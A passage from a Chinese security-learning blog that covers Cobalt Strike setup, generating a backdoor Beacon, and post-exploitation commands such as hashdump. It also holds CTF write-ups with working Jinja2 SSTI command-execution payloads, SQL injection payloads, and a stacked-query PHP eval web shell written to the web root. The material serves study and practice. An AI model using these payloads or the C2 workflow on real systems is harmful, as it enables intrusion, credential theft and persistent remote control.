alt="image-20210603135728701"></p><p>记得一定要把所有文件都传到linux里面，我开始没传完，一直报错，md忙了半小时，最后在徐神的帮助下才解决，日了。</p><h4 id="客户端连接服务端"><a href="#客户端连接服务端" class="headerlink" title="客户端连接服务端"></a>客户端连接服务端</h4><p>直接运行那个exe文件即可，里面的内容按刚才你填的内容写，然后IP地址、端口和密码必须跟刚才服务端那里保持一致，而用户名是可以随意设置的，这就是让团队使用的，就像一堆人连一个WiFi一样。</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603141524952.png" alt="image-20210603141524952"></p><p>配置好的界面就像上面的这样，但是全是英语单词沃日，能看懂，但是只能看懂一点点。</p><h3 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h3><p><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129">这里是详细的教程总结处</a></p><p>我这里只写我用到的各种东西(或者说是比较常用的东西)。</p><p><strong>工具栏</strong></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603143946539.png" alt="image-20210603143946539"></p><p>再就是要总结一下使用的流程吧</p><h4 id="生成木马后门"><a href="#生成木马后门" class="headerlink" title="生成木马后门"></a>生成木马后门</h4><p>首先就是创建后门木马程序啦，这一步也是整体的流程的关键一环，称之为最关键的一步也不为过，这一步直接关系到我们的木马能不能上线。这一步中最关键又是其中的免杀，但是免杀还不是我现在能研究的了的。</p><p><strong>如何生成后门木马程序</strong></p><p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了下面的几个Listener</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603144418716.png" alt="image-20210603144418716"></p><p>其中一般化使用的是上面的5个Beacon的payload</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603144755208.png" alt="image-20210603144755208"></p><p>使用TCP连接生成的payload更为简单，直接点击下面的save</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/QQ录屏20210603145725.gif" alt="QQ录屏20210603145725"></p><p>保存后门木马文件到桌面上后，可以到虚拟机里面测试木马的性能。这里开始我用的tcp(但是一开始忘开4444端口了，后来就换成http了，注意<strong>这里的4444端口是你的vps上需要开的端口，用来接收反弹shell的</strong>)，后来发现还是http好用似乎。就直接换成http了，也懒得开虚拟机了，直接在我的物理机上测试算了。</p><p>简单地测试了一下，还是可以用的</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603160232678.png" alt="dump了一下用户密码的hash值"></p><p>hash值都dump下来了，就能在本地直接使用hashcat碰撞用户的密码啦。</p><h4 id="上线后的命令"><a href="#上线后的命令" class="headerlink" title="上线后的命令"></a>上线后的命令</h4><p>下面只记录不会太多，估计只会记录<strong>常见的、炫酷的和有用的</strong>。</p><pre class="line-numbers language-none"><code class="language-none">hashdump   # 把受害者主机的用户名和密码的hash值脏下来screenshot  # 获得受害者PC的正在显示的情况的截图，估计只是模拟按键PrntScr而已<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="桌面截图"><a href="#桌面截图" class="headerlink" title="桌面截图"></a>桌面截图</h5><p><code>screenshot</code></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603161052384.png" alt="生成截图的功能"></p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>可以直接获得受害者主机的目录并且可以上传文件，这就方便了我们后续上传更强力的马、更针对受害者环境的马。</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603222144746.png" alt="可以看到这个jar文件就是我后来通过CS上传到我的虚拟机上的"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CS后门使我们可以后续持续对受害者网络进行攻击，具体再说怎么使用就要到实战中去了，毕竟实战才是提升自己实力的最快的途径。</p><h2 id="Shiro-反序列化综合利用工具"><a href="#Shiro-反序列化综合利用工具" class="headerlink" title="Shiro 反序列化综合利用工具"></a>Shiro 反序列化综合利用工具</h2><p><a href="https://github.com/j1anFen/shiro_attack">工具的下载地址</a>，该工具应该是基于Java的，所以可以跨平台使用。</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="在线信息收集"><a href="#在线信息收集" class="headerlink" title="在线信息收集"></a>在线信息收集</h2><p><a href="https://blog.csdn.net/bring_coco/article/details/114485091?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-114485091.pc_agg_rank_aggregation&amp;utm_term=fofa%E7%9A%84%E8%AF%AD%E6%B3%95&amp;spm=1000.2123.3001.4430">fofa语法</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题笔记</title>
      <link href="2021/05/28/CTF/"/>
      <url>2021/05/28/CTF/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    本片文章主要写的内容——CTF领域内我所学到的所有方向的笔记。    </p><p>​    之前的博客环境与内容坏了，内容还在，不过md的内容已经永久遗失了，之后会将所有的关于CTF内容记录到此文件内，笔记的内容尽量不超过20万字，防止读者打开的速度过慢。</p><p>​    之后会将从前写的文章放到百度网盘内备份，并且随着我放到我的VPS内，如果我没vps了就访问如下的GitHub的地址，不过这里面的url确实挺长的，如果你对我从前文章的内容感兴趣的话，请访问<a href="https://github.com/m4xlmum/a16n.github.io/">我从前的博客</a>，但是其实以前的内容也没啥，直接dump下来看好了。往后一定认真写博客，主要的是一定要备份，以前写的好多文章都没了，还是挺心疼的(还好备份还在)</p><ol><li>WEB——网络安全，主要考察一些web安全漏洞，包括SQL注入、xss、xxe、ssti、代码审计、反序列化安全、各种cms的漏洞等。</li><li>MISC——杂项，考察内容覆盖广泛，主要包含隐写术、古典密码学、压缩包、图片、编码、取证等方面。</li><li>REVERSE——逆向工程，主要考察软件破解与软件算法逆向。有时会涉及软件脱壳与动态调试。</li><li>MOBILE——移动安全，类似于逆向工程，主要考察软件破解、算法逆向、脱壳与动态调试。</li><li>CRYPTO——密码学，以”XX学”命名的肯定很难啦，主要方向有古典密码、现代密码，现代密码又可以分为流密码、分组密码、公钥密码等。</li></ol><h1 id="Hack-The-Box"><a href="#Hack-The-Box" class="headerlink" title="Hack The Box"></a>Hack The Box</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>夹杂在众多CTF题目中的多股清流，下面分为WEB、MISC这些类的都是题目比较杂、比较多的平台上的总结。再分几个比较小的平台的写，这是第一个，界面超炫酷的HTB。</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="快速传参-Emdee-five-for-life"><a href="#快速传参-Emdee-five-for-life" class="headerlink" title="快速传参-Emdee five for life"></a>快速传参-Emdee five for life</h3><p><img src="/2021/05/28/CTF/image-20210602225736815.png" alt="image-20210602225736815"></p><p><img src="/2021/05/28/CTF/image-20210602225914557.png" alt="image-20210602225914557"></p><p>第一关太简单了（一看就知道这不就是签到题嘛，靠的就是写脚本，快速传参吧），本来都懒得写了，但是本着做做也无所谓的念头还是写了个简单的脚本来搞</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5url <span class="token operator">=</span> <span class="token string">'http://46.101.33.243:31878/'</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>textres <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>dmd5 <span class="token operator">=</span> res<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'h3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span class="token comment"># 使用bs4解析网页数据</span>ymd5 <span class="token operator">=</span> md5<span class="token punctuation">(</span>dmd5<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>resp2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'hash'</span><span class="token punctuation">:</span> ymd5<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>BeautifulSoup<span class="token punctuation">(</span>resp2<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>稍微优化了一下下呀。</p><p><img src="/2021/05/28/CTF/image-20210602232640054.png" alt="炫酷的界面"></p><h3 id="SSTI、Jinja2-Templated"><a href="#SSTI、Jinja2-Templated" class="headerlink" title="SSTI、Jinja2-Templated"></a>SSTI、Jinja2-Templated</h3><pre class="line-numbers language-none"><code class="language-none">Site still under constructionProudly powered by Flask&#x2F;Jinja2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开局给的提示，用的python的flask写的，这很明显的ssti漏洞，而且还是Jinja2的。</p><p>ssti但是没有给注入点提示啊，给个<code>id=1</code>也好啊，这种情况我也么啥好用的工具，只好看看wp，原来直接<code>/&#123;&#123;7+7&#125;&#125;</code>就行了，然后就是Jinja2的专用payload了，一般这些ssti的payload都是相似的，所以总结一下。</p><p><a href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文</a></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#123;&#123;config&#125;&#125;&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>class是本类、mro是父类、subclasses是子类集合，这里的子类是<code>186</code>里面有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>似乎是。</p><p><img src="/2021/05/28/CTF/image-20210602234813169.png" alt="image-20210602234813169"></p><pre class="line-numbers language-none"><code class="language-none">HTB&#123;t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入常用函数与知识点"><a href="#SQL注入常用函数与知识点" class="headerlink" title="SQL注入常用函数与知识点"></a>SQL注入常用函数与知识点</h3><h4 id="字符串提取-substr、mid"><a href="#字符串提取-substr、mid" class="headerlink" title="字符串提取(substr、mid)"></a>字符串提取(substr、mid)</h4><div class="table-container"><table><thead><tr><th>函数名称</th><th>函数使用</th><th>函数功能</th><th>详细链接</th></tr></thead><tbody><tr><td>substr</td><td>substr()</td><td></td><td></td></tr><tr><td>mid</td><td>mid(“text”,1,1)</td><td>返回t，第一个1表示起始位置，第二个1表示截取长度</td><td><a href="https://www.w3school.com.cn/sql/sql_func_mid.asp">MID使用</a></td></tr></tbody></table></div><p><img src="/2021/05/28/CTF/image-20210601161051184.png" alt="mid方法"></p><h3 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次注入就是在一个地方进行数据库插入，另一个地方进行数据库数据的取出，插入时可能对注入进行了过滤啥的，但是取出的时候没进行过滤，就能执行我们想要插入的恶意代码了。</p><p>但是这个注入的断定是比较难的，因为要对两个不同的位置进行联合测试，应该是所有注入类型中最难找到的了，实战中我们往往会错过这类注入点。</p><p>这类注入点没有特定的payload，往往与下面的各种注入类型交叉使用。</p><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>一般分为<code>单引号</code>、<code>双引号</code>的字符型联合注入，和数字型联合注入。</p><p>联合查询注入现在实战应用中已经很少了，这种是没有什么难度的。</p><h4 id="盲注-时间盲注、布尔盲注"><a href="#盲注-时间盲注、布尔盲注" class="headerlink" title="盲注(时间盲注、布尔盲注)"></a>盲注(时间盲注、布尔盲注)</h4><h4 id="异或盲注"><a href="#异或盲注" class="headerlink" title="异或盲注"></a>异或盲注</h4><h4 id="形成原理与payload"><a href="#形成原理与payload" class="headerlink" title="形成原理与payload"></a>形成原理与payload</h4><p><strong>盲注的形成原理都是相同的，不存在返回值，或者只存在对于错的返回值这种，但是我们插入进去的SQL语句又实实在在是起到了作用了的就能使用盲注来进行获取数据信息。</strong></p><p>这里主要再说一下异或盲注的形成原理与payload，异或注入的表现为<code>?id=1^1^1</code>返回的是<code>?id=1</code>的内容、<code>?id=1^0^1</code>返回的是<code>?id=0</code>的内容。这样就能借助SQL里面的一些方法来获取数据库里面的数据信息啦。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不断变换<code>database()</code>处为我们想注入的SQL语句、后面第一个1是第几个字母、后面的32为字母的值。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h4 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h4><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="简单介绍与一般payload"><a href="#简单介绍与一般payload" class="headerlink" title="简单介绍与一般payload"></a>简单介绍与一般payload</h5><p>堆叠注入是利用<code>;</code>隔开几个查询语句，使得几个查询语句都可以进行，从而进行SQL注入。危险的SQL语句一般为<code>mysql_multi_query()</code>，因为<code>mysql_multi_query()</code> 支持多条sql语句同时执行，每个SQL语句使用<code>;</code>分隔即可分别执行。</p><p>没有固定的payload一般payload如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span class="token number">1</span>"<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是实战时只是用上面的语句的可能性几乎为零，而且这个似乎只是php的这个<code>mysql_multi_query()</code>语句的特性，而实战时几乎好多都是jsp、asp等老网页，也是比较安全的(一定是我现在太菜了，还没开始学jsp、asp的原因才会觉得这两种语言写的网页安全)。</p><h4 id="绕过限制Bypass"><a href="#绕过限制Bypass" class="headerlink" title="绕过限制Bypass"></a>绕过限制Bypass</h4><p>基于上面的几种注入又各自有不同的绕过限制的方法，上面的几种注入只是我们使用SQL注入的大纲，但是更重要的是各种限制的绕过，比如说禁用了单双引号，也许可以想想使用<code>\</code>来转义单双引号来绕过限制等等。</p><hr><h3 id="二次注入-1"><a href="#二次注入-1" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h4><p><strong>TAG:二次注入、联合查询注入</strong></p><p>给出的有两个功能，一个注册登录、一个修改密码的功能(查询的是用户名)</p><p>先使用下面的payload进行测试</p><pre class="line-numbers language-none"><code class="language-none">username &#x3D; 1&#39; union select database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>password可以自己随便设置，直接登录即可发现数据已经注出来了。</p><p><img src="/2021/05/28/CTF/image-20210604235055344.png" alt="image-20210604235055344"></p><p>这题不是盲注就不用使用脚本了，直接贴出所有的payload，直接注册登录就能查询到信息了。</p><p><strong>爆数据表</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210604235538363.png" alt="image-20210604235538363"></p><p><strong>爆列名</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39; #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210604235738874.png" alt="image-20210604235738874"></p><p><strong>获取数据</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select * from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210604235837283.png" alt="image-20210604235837283"></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;fd2e5523-e1d1-4f17-aa7a-a85142ff023f&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="sql注入getshell、-SUCTF-2018-MultiSQL"><a href="#sql注入getshell、-SUCTF-2018-MultiSQL" class="headerlink" title="sql注入getshell、[SUCTF 2018]MultiSQL"></a>sql注入getshell、[SUCTF 2018]MultiSQL</h4><p>这个给出的是一个小网站，有登录、注册、查看个人信息、上传个人头像等功能。</p><p><img src="/2021/05/28/CTF/image-20210601150932381.png" alt="image-20210601150932381"></p><p>根据上面的这个payload确认这里是存在SQL注入漏洞的，而且还是异或注入。可以用下面的payload自行进行测试</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^0^1http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^1^1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后接下去继续测试注入，但是substr似乎是被过滤掉了，这里考虑使用mid来替代substr</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里不仅仅有异或注入，还有堆叠注入，直使用下面的payload也是没有报错的</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就是堆叠注入用<code>select into outfile</code>写入shell，这是一个php做的网站，所以可以用下面的payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"select '&lt;?php eval($_POST[4]);?>' into outfile '/var/www/html/favicon/shell.php';"</span>res <span class="token operator">=</span> <span class="token string">"char("</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">','</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token comment"># char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,52,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用sql的预处理来写shell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@payload</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> shell <span class="token keyword">from</span> <span class="token variable">@payload</span><span class="token punctuation">;</span><span class="token keyword">execute</span> shell<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>预处理的实验</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token variable">@payload</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">PREPARE</span> i <span class="token keyword">FROM</span> <span class="token variable">@payload</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>只是不知道为什么执行成功了，但是没有返回数据库的信息，只显示了查询出了多少行。</p><p>执行上面的payload之后在这里找shell<code>/favicon/shell.php</code>，蚁剑连接shell即可。</p><p><img src="/2021/05/28/CTF/image-20210601175949497.png" alt="image-20210601175949497"></p><p><img src="/2021/05/28/CTF/image-20210601180101679.png" alt="找到flag即可"></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SSTI全名为服务端模板注入。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><p><a href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文CSDN</a></p><ol><li>第一个Jinja2，较为常见的。</li></ol><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#123;&#123;config&#125;&#125;&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="编码与密码"><a href="#编码与密码" class="headerlink" title="编码与密码"></a>编码与密码</h2><h3 id="一些特殊编码的题目"><a href="#一些特殊编码的题目" class="headerlink" title="一些特殊编码的题目"></a>一些特殊编码的题目</h3><h4 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h4><p>给出的附件内容如下：</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">(╯°□°）╯︵ ┻━┻50pt(╯°□°）╯︵ ┻━┻d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd<span aria-hidden="true" 